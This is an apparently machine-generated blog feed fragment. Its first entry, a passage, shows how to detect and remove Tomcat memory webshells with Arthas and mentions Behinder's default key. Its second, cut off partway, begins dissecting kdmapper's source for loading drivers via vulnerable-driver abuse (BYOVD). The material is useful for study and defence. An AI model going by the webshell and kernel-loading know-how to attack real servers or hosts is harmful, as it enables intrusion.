src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906211716113.png" alt="image-20250906211716113"></p><p>容易看到，和我们定义的密码并不一致，是因为此处进行了重新赋值</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906211834015.png" alt="image-20250906211834015"></p><h2 id="根据代码解密数据流量"><a href="#根据代码解密数据流量" class="headerlink" title="根据代码解密数据流量"></a>根据代码解密数据流量</h2><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906214208916.png" alt="image-20250906214208916"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906214004586.png" alt="image-20250906214004586"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906214145830.png" alt="image-20250906214145830"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906213831832.png" alt="image-20250906213831832"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906213908026.png" alt="image-20250906213908026"></p><p>百度了一下这个秘钥怎么生成的，发现是我们使用shiro打内存马的时候给的一个默认的密码pass1024。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906215104215.png" alt="image-20250906215104215"></p><h2 id="查看类内存中的实例及其变量值"><a href="#查看类内存中的实例及其变量值" class="headerlink" title="查看类内存中的实例及其变量值"></a>查看类内存中的实例及其变量值</h2><h3 id="首先查找类的实例对象"><a href="#首先查找类的实例对象" class="headerlink" title="首先查找类的实例对象"></a>首先查找类的实例对象</h3><p>使用 <code>sc</code>命令查看类的详细信息，获取类的 <code>classLoaderHash</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc -d com.summersec.x.BehinderFilter</span><br></pre></td></tr></table></figure><p>输出示例：</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906220239465.png" alt="image-20250906220239465"></p><p>记下 <code>classLoaderHash</code>8575f07。</p><hr><h3 id="查看类的所有实例"><a href="#查看类的所有实例" class="headerlink" title="查看类的所有实例"></a>查看类的所有实例</h3><p>使用 <code>vmtool</code>命令获取类的所有实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmtool --action getInstances -c 8575f07 --className com.summersec.x.BehinderFilter</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906221123904.png" alt="image-20250906221123904"></p><p>输出会显示所有实例的对象ID</p><hr><h3 id="查看特定实例的字段值"><a href="#查看特定实例的字段值" class="headerlink" title="查看特定实例的字段值"></a>查看特定实例的字段值</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmtool --action getInstances -c 8575f07 --className com.summersec.x.BehinderFilter --express <span class="string">&#x27;instances[0]&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250906221103656.png" alt="image-20250906221103656"></p><p>能看到这个时候<code>path</code>就已经对上了。</p><h1 id="五种基础内存马查杀"><a href="#五种基础内存马查杀" class="headerlink" title="五种基础内存马查杀"></a>五种基础内存马查杀</h1><p>现在已经会基础使用了，可以进行内存马的查杀了</p><p>下面五种基础内存马，都是基于该文章中实现的<a href="https://xz.aliyun.com/news/18301">https://xz.aliyun.com/news/18301</a></p><p>复现代码<a href="https://github.com/y1shiny1shin/servletDemo%EF%BC%8Ctomcat">https://github.com/y1shiny1shin/servletDemo，tomcat</a> 8.5.31，jdk 8.202</p><h2 id="Serlvet-内存马"><a href="#Serlvet-内存马" class="headerlink" title="Serlvet 内存马"></a>Serlvet 内存马</h2><p>基础<code>Servlet</code>马的逻辑，是新建一个<code>Wrapper</code>之后，将<code>恶意Servlet</code>用<code>Wrapper</code>包装，再写入到StandardContext。</p><p>如果我们想要写一个Servlet内存马，需要经过以下步骤：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. 找到StandardContext</span><br><span class="line">2. 继承并编写一个恶意servlet</span><br><span class="line">3. 创建Wapper对象</span><br><span class="line">4. 设置Servlet的LoadOnStartUp的值</span><br><span class="line">5. 设置Servlet的Name</span><br><span class="line">6. 设置Servlet对应的Class</span><br><span class="line">7. 将Servlet添加到context的children中</span><br><span class="line">8. 将url路径和servlet类做映射</span><br></pre></td></tr></table></figure><p>首先直接删掉Servlet对象肯定是不可取的，如果是报错处理不太行的系统，直接删对象可能服务直接就崩了； </p><p>那么我们进入<code>StandardContext</code>中，分析一下<code>addChild</code>和<code>addServletMappingDecoded</code>是怎么个逻辑；</p><p>去掉一些报错处理的代码之后的核心代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// addChild核心代码</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">isJspServlet</span> <span class="operator">=</span> <span class="string">&quot;jsp&quot;</span>.equals(child.getName());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allow webapp to override JspServlet inherited from global web.xml.</span></span><br><span class="line"><span class="keyword">if</span> (isJspServlet) &#123;</span><br><span class="line">    oldJspServlet = (Wrapper) findChild(<span class="string">&quot;jsp&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (oldJspServlet != <span class="literal">null</span>) &#123;</span><br><span class="line">        removeChild(oldJspServlet);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">super</span>.addChild(child);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isJspServlet &amp;&amp; oldJspServlet != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The webapp-specific JspServlet inherits all the mappings</span></span><br><span class="line"><span class="comment">     * specified in the global web.xml, and may add additional ones.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    String[] jspMappings = oldJspServlet.findMappings();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; jspMappings!=<span class="literal">null</span> &amp;&amp; i&lt;jspMappings.length; i++) &#123;</span><br><span class="line">        addServletMappingDecoded(jspMappings[i], child.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//addServletMappingDecoded</span></span><br><span class="line"><span class="type">String</span> <span class="variable">adjustedPattern</span> <span class="operator">=</span> adjustURLPattern(pattern);</span><br><span class="line"></span><br><span class="line"><span class="keyword">synchronized</span> (servletMappingsLock) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name2</span> <span class="operator">=</span> servletMappings.get(adjustedPattern);</span><br><span class="line">    <span class="keyword">if</span> (name2 != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// Don&#x27;t allow more than one servlet on the same pattern</span></span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) findChild(name2);</span><br><span class="line">        wrapper.removeMapping(adjustedPattern);</span><br><span class="line">    &#125;</span><br><span class="line">    servletMappings.put(adjustedPattern, name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) findChild(name);</span><br><span class="line">wrapper.addMapping(adjustedPattern);</span><br><span class="line"></span><br><span class="line">fireContainerEvent(<span class="string">&quot;addServletMapping&quot;</span>, adjustedPattern);</span><br></pre></td></tr></table></figure><p>那么很明显的，<code>addServletMappingDecoded</code>中的<code>servletMapping</code>将<code>servletPath</code>和<code>servletName</code>进行了绑定；</p><p>那么运行环境之后，访问<a href="http://127.0.0.1:8082/servletDemo_war_exploded/injectServlet%EF%BC%8C%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%88%90%E5%8A%9F%E4%B9%8B%E5%90%8E">http://127.0.0.1:8082/servletDemo_war_exploded/injectServlet，执行命令成功之后</a></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907015052546.png" alt="image-20250907015052546"></p><p>使用Arthas连接到进程中，获取到<code>StandardContext</code>先</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907022007955.png" alt="image-20250907022007955"></p><p>那么选择到第二个</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907022115960.png" alt=""></p><p>这样就可以获取到该类了，那么现在需要获取到类中的<code>servletMapping</code></p><p>这是注入内存马之前。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907022256742.png" alt="image-20250907022256742"></p><p>注入内存马之后。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907022416847.png" alt="image-20250907022416847"></p><p>其实一眼就能看出来exec这个路由是恶意的，值得注意的是，这里的<code>servletMappings</code>是hashmap，那么可以直接尝试<code>remove</code>掉这个路由</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907022704324.png" alt="image-20250907022704324"></p><p>发现还是可以执行命令。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907022805037.png" alt="image-20250907022805037"></p><p>那么说明直接删路由并不能直接导致木马失效，那么再找一下代码</p><p>非常的幸运，找到了</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907022927478.png" alt="image-20250907022927478"></p><p>那么既然这里封装好了移除servlet的方法，直接调用试试看</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907023100245.png" alt="image-20250907023100245"></p><p>值得注意的是，这里如果你是删除了<code>servletMappings</code>中的<code>/exec</code>之后，再执行<code>removeServletMapping</code>的话，那么代码将不会执行<code>wrapper.removeMapping(pattern);</code></p><p>因为<code>HashMap</code>中的<code>remove</code>方法，会返回<code>key</code>对应的<code>value</code>值</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250714012828052.png" alt="img"></p><p>那么如果<code>remove</code>之后，在<code>remove</code>的话，就会返回<code>null</code></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250714013000090.png" alt="img"></p><p><code>name=null</code>，那么<code>wrapper=null</code>，if语句就不会执行</p><p>那如果说，手贱不小心remove了呢，还有补救方法吗？</p><p>补救方法就是再手动执行一遍<code>removeMapping</code>方法就可以了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmtool --action getInstances --className org.apache.catalina.core.StandardContext --express <span class="string">&#x27;instances[1].findChild(&quot;execServlet&quot;).removeMapping(&quot;/exec&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907024339597.png" alt="image-20250907024339597"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907024547988.png" alt="image-20250907024547988"></p><h2 id="Listener-内存马"><a href="#Listener-内存马" class="headerlink" title="Listener 内存马"></a>Listener 内存马</h2><p>这类内存马偏简单，新建一个继承了<code>javax.servlet.ServletRequestListener</code>的恶意<code>Listener</code>，再把恶意<code>Listener</code>给添加到<code>StandardContext</code>中</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907150150055.png" alt="image-20250907150150055"></p><p>看起来只是简单的添加到<code>applicationEventListenersList</code>中</p><p>那么用Arthas从<code>applicationEventListenersList</code>中去掉指定的<code>listener</code>试试看</p><p>访问<code>http://127.0.0.1:8082/servletDemo_war_exploded/injectLister</code>可以注入恶意listener后启动Arthas，执行命令成功</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907150321912.png" alt="image-20250907150321912"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907150703008.png" alt="image-20250907150703008"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmtool --action getInstances --className org.apache.catalina.core.StandardContext --express <span class="string">&#x27;instances[0].applicationEventListenersList&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907150858859.png" alt="image-20250907150858859"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907151022390.png" alt="image-20250907151022390"></p><p>由于这是一个<code>List</code>对象，所以只能用索引来删除，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmtool --action getInstances --className org.apache.catalina.core.StandardContext --express <span class="string">&#x27;instances[0].applicationEventListenersList.remove(0)&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Filter-内存马"><a href="#Filter-内存马" class="headerlink" title="Filter 内存马"></a>Filter 内存马</h2><p>这个稍微麻烦一点点，但是麻烦的也只是步骤</p><p>访问<code>http://127.0.0.1:8082/servletDemo_war_exploded/injectFilter</code> 注入内存马</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907181224721.png" alt="image-20250907181224721"></p><p>Filter内存马是需要写入到<code>FilterMap</code>和<code>FilterDef</code>的</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250715090547413.png" alt="img"></p><p>并且是在<code>FilterMap</code>处绑定了路由，那么我们查就需要获取到<code>FilterMap</code>对象，而<code>FilterMap</code>又是通过<code>addFilterMap</code>添加的，进入该方法看看</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250715090900811-20250907165127281.png" alt="img"></p><p>那么我们使用Arthas看看<code>filterMaps</code>这个变量</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907172716442.png" alt="image-20250907172716442"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907172735090.png" alt="image-20250907172735090"></p><p>那么就已经查到了恶意路由</p><p>获取到恶意的FilterMap之后，调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.catalina.core.StandardContext.ContextFilterMaps#remove</span><br></pre></td></tr></table></figure><p>或者是往上一层 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.catalina.core.StandardContext#removeFilterMap</span><br></pre></td></tr></table></figure><p>那么既然StandardContext都已经封装好了，那么就用封装好的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmtool --action getInstances --className org.apache.catalina.core.StandardContext --express <span class="string">&#x27;#evilMap=instances[0].filterMaps.array[0],#standardContext=instances[0],#standardContext.removeFilterMap(#evilMap)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907180728160.png" alt="image-20250907180728160"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907182417069.png" alt="image-20250907182417069"></p><p>杀马成功。</p><h2 id="Valve-内存马"><a href="#Valve-内存马" class="headerlink" title="Valve 内存马"></a>Valve 内存马</h2><p>这个注入很简单，将<code>恶意Valve</code>对象添加进<code>StandardPipeline</code>就可以了</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250715094317974.png" alt="img"></p><p>访问<code>http://127.0.0.1:8082/servletDemo_war_exploded/injectValve</code>注入内存马</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250908012707752.png" alt="image-20250908012707752"></p><p>进入StandardPipeline之后，看有什么方法</p><p> <img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250715093636584.png" alt="img"></p><p>存在一个getValves，那么调用看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vmtool --action getInstances --className org.apache.catalina.core.StandardContext --express <span class="string">&#x27;instances[0].getPipeline&#x27;</span></span><br><span class="line"></span><br><span class="line">vmtool --action getInstances --className org.apache.catalina.core.StandardContext --express <span class="string">&#x27;instances[0].getPipeline.getValves&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250908013658009.png" alt="image-20250908013658009"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250908013814240.png" alt="image-20250908013814240"></p><p>刚好也封装有<code>removeValve</code>方法，那么直接调用该方法。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vmtool --action getInstances --className org.apache.catalina.core.StandardContext --express <span class="string">&#x27;#valve=instances[0].getPipeline().getValves()[1],#standardContext=instances[0].getPipeline().removeValve(#valve)&#x27;</span></span><br><span class="line">null</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250908014101515.png"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250908014206170.png" alt="image-20250908014206170"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Arthas介绍&quot;&gt;&lt;a href=&quot;#Arthas介绍&quot; class=&quot;headerlink&quot; title=&quot;Arthas介绍&quot;&gt;&lt;/a&gt;Arthas介绍&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/alibaba/arthas/blo</summary>
      
    
    
    
    <category term="java安全" scheme="https://250wuyifan.github.io/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="java安全" scheme="https://250wuyifan.github.io/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>kdmapper内存加载代码快速解析</title>
    <link href="https://250wuyifan.github.io/2025/08/30/kdmapper%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90/"/>
    <id>https://250wuyifan.github.io/2025/08/30/kdmapper%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90/</id>
    <published>2025-08-29T20:46:14.000Z</published>
    <updated>2025-08-30T09:16:14.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>《内存加载驱动》文章里面，我们详细看了一下如何使用驱动去内存加载驱动，落实到实际种，我们需要解决的问题还是怎么与BYOVD联动起来，而kdmapper工具，已经写好了这个操作，但是代码跟上篇文章还是有很大差别，在此给代码做个详解。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830045112624.png" alt="image-20250830045112624"></p><h2 id="项目描述"><a href="#项目描述" class="headerlink" title="项目描述"></a>项目描述</h2><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830045330193.png" alt="image-20250830045330193"></p><h2 id="项目代码大纲"><a href="#项目代码大纲" class="headerlink" title="项目代码大纲"></a>项目代码大纲</h2><p>打开给的项目sln，我们看一下，也是很多文件的</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830045223603.png" alt="image-20250830045223603"></p><p>粗略的看一下文件名，都是什么功能，直接编译解决方案，进行使用，没有报错的话，说明可行</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830045625978.png" alt="image-20250830045625978"></p><h2 id="从main-cpp入手"><a href="#从main-cpp入手" class="headerlink" title="从main.cpp入手"></a>从main.cpp入手</h2><p>项目运行的时候肯定是从main函数运行的，我们从此代码入手。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">wmain</span><span class="params">(<span class="type">const</span> <span class="type">int</span> argc, <span class="type">wchar_t</span>** argv)</span> </span>&#123;</span><br><span class="line"><span class="built_in">SetUnhandledExceptionFilter</span>(SimplestCrashHandler);</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> free = <span class="built_in">paramExists</span>(argc, argv, <span class="string">L&quot;free&quot;</span>) &gt; <span class="number">0</span>;</span><br><span class="line"><span class="type">bool</span> indPagesMode = <span class="built_in">paramExists</span>(argc, argv, <span class="string">L&quot;indPages&quot;</span>) &gt; <span class="number">0</span>;</span><br><span class="line"><span class="type">bool</span> passAllocationPtr = <span class="built_in">paramExists</span>(argc, argv, <span class="string">L&quot;PassAllocationPtr&quot;</span>) &gt; <span class="number">0</span>;</span><br><span class="line"><span class="type">bool</span> copyHeader = <span class="built_in">paramExists</span>(argc, argv, <span class="string">L&quot;copy-header&quot;</span>) &gt; <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (free) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[+] Free pool memory after usage enabled&quot;</span> &lt;&lt; std::endl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (indPagesMode) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[+] Allocate Independent Pages mode enabled&quot;</span> &lt;&lt; std::endl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (free &amp;&amp; indPagesMode) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] Can&#x27;t use --free and --indPages at the same time&quot;</span> &lt;&lt; std::endl);</span><br><span class="line"><span class="built_in">help</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (passAllocationPtr) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[+] Pass Allocation Ptr as first param enabled&quot;</span> &lt;&lt; std::endl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (copyHeader) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[+] Copying driver header enabled&quot;</span> &lt;&lt; std::endl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PDB_OFFSETS</span></span><br><span class="line"><span class="type">bool</span> UpdateOffset = !(<span class="built_in">paramExists</span>(argc, argv, <span class="string">L&quot;dontUpdateOffsets&quot;</span>) &gt; <span class="number">0</span>);</span><br><span class="line"><span class="type">int</span> FilePathParamIdx = <span class="built_in">paramExists</span>(argc, argv, <span class="string">L&quot;offsetsPath&quot;</span>);</span><br><span class="line">std::wstring offsetFilePath = utils::<span class="built_in">GetCurrentAppFolder</span>() + <span class="string">L&quot;\\offsets.ini&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (UpdateOffset &amp;&amp; FilePathParamIdx &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">&quot;[-] Can&#x27;t set --offsetsPath without set --dontUpdateOffsets&quot;</span> &lt;&lt; std::endl);</span><br><span class="line"><span class="built_in">help</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (FilePathParamIdx &gt; <span class="number">0</span>) &#123;</span><br><span class="line">offsetFilePath = argv[FilePathParamIdx + <span class="number">1</span>];</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">&quot;[+] Setting Offsets File Path To: &quot;</span> &lt;&lt; offsetFilePath &lt;&lt; std::endl);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> drvIndex = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; argc; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (std::filesystem::<span class="built_in">path</span>(argv[i]).<span class="built_in">extension</span>().<span class="built_in">string</span>().<span class="built_in">compare</span>(<span class="string">&quot;.sys&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">drvIndex = i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (drvIndex &lt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">help</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> std::wstring driver_path = argv[drvIndex];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!std::filesystem::<span class="built_in">exists</span>(driver_path)) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] File &quot;</span> &lt;&lt; driver_path &lt;&lt; <span class="string">L&quot; doesn&#x27;t exist&quot;</span> &lt;&lt; std::endl);</span><br><span class="line"><span class="built_in">PauseIfParentIsExplorer</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PDB_OFFSETS</span></span><br><span class="line"><span class="keyword">if</span> (!KDSymbolsHandler::<span class="built_in">GetInstance</span>()-&gt;<span class="built_in">ReloadFile</span>(offsetFilePath, UpdateOffset ? utils::<span class="built_in">GetCurrentAppFolder</span>() + <span class="string">L&quot;\\&quot;</span> + SYM_FROM_PDB_EXE : <span class="string">L&quot;&quot;</span>)) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] Error: Failed To Get Symbols Info.&quot;</span> &lt;&lt; std::endl);</span><br><span class="line"><span class="built_in">PauseIfParentIsExplorer</span>();</span><br><span class="line"><span class="keyword">return</span> <span 